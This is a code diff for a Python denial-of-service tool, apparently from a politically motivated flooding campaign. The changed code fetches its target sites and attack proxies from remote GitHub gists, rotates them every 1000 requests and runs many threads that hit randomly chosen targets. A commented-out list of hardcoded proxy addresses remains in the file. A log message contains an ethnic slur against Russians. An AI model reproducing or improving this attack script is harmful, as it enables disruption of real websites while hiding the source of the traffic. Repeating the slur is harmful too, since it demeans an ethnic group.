@@ -52,53 +52,30 @@ def generate_MIR_data(url):
     return dat
 
 
-def check_proxie(checker, proxy_str):
-    scraper = base_scraper()
-
-    scraper.proxies.update({'http': "http://" + (proxy_str + checker),
-                            'https': "https://" + (proxy_str + checker)})
-
-    try:
-        resp = scraper.get(checker, timeout=0.5)
-        if resp.status_code < 200 or resp.status_code > 400:
-            return False
-
-        return True
-    except:
-        return False
-
-
-def check_taget(target, proxy_str):
-    scraper = base_scraper()
-
-    scraper.proxies.update({'http': "http://" + proxy_str + target,
-                           'https': "https://" + proxy_str + target})
-
-    try:
-        resp = scraper.get(target)
-        if resp.status_code > 500:
-            return False
-    except:
-        return False
-
-    return True
-
 def mainth(protocol, ip, proxy_name, region):
     # Fetching data with proxy and targets
-    with open('list.txt') as f:
-        sites = f.read().splitlines()
+    sites = get_sites()
 
     counter403 = {}
 
+    counter_total = 0
+
     while True:
+        counter_total += 1
+        if counter_total > 1000:
+            sites = get_sites()
+            proxies = get_proxies()
+            (protocol, ip, proxy_name, region) = choice(proxies)
         scraper = base_scraper()
         logger.info("GET RESOURCES FOR ATTACK")
         # data = choice(sites)
         if len(sites) <= 0:
             logger.info("MOSKALI SOSUT! ATTACK WILL BE RESTARTED IN FEW MINUTES")
             sleep(300)
-            with open('list.txt') as f:
-                sites = f.read().splitlines()
+            counter_total = 100500
+            continue
+            # with open('list.txt') as f:
+            #     sites = f.read().splitlines()
 
         index_ = randint(0, len(sites) - 1)
         current_target = sites[index_]
@@ -151,14 +128,25 @@ def cleaner():
         collect()
 
 
+def get_sites():
+    # with open('list.txt') as f:
+    #     sites = f.read().splitlines()
+    return loads(requests.get("https://gist.githubusercontent.com/Mekhanik/3d90e637a86401bf726b489d2adeb958/raw/d272857059be790aa7b24100d2ef0859aabe6cf5/tg").content)
+
+
+def get_proxies():
+    # proxies = [
+    #     ('http://', 'http://193.23.50.206:11335', 'mobile', 'all', ),
+    #     # ('https://', 'http://193.23.50.164:10215', 'residental', '.ru', ),
+    #     ('https://', 'socks5://193.23.50.164:10216', 'socks', 'all', ),
+    #     # ('http://', 'http://143.110.243.165:10815', 'mobile', 'all', ),
+    #     # ('https://', 'http://109.248.7.93:11108', 'residental', 'all',),
+    # ]
+    return loads(requests.get("https://gist.githubusercontent.com/Mekhanik/6d36aa2f722b3fd957ca5521ce0242b2/raw/788e61df5031b62183aab3c59f64b9b7a58ce2d7/px").content)
+
+
 if __name__ == '__main__':
-    proxies = [
-        ('http://', 'http://193.23.50.206:11335', 'mobile', 'all', ),
-        # ('https://', 'http://193.23.50.164:10215', 'residental', '.ru', ),
-        ('https://', 'socks5://193.23.50.164:10216', 'socks', 'all', ),
-        # ('http://', 'http://143.110.243.165:10815', 'mobile', 'all', ),
-        # ('https://', 'http://109.248.7.93:11108', 'residental', 'all',),
-    ]
+    proxies = get_proxies()
     for _ in range(threads):
         Thread(target=mainth, args=choice(proxies)).start()
 
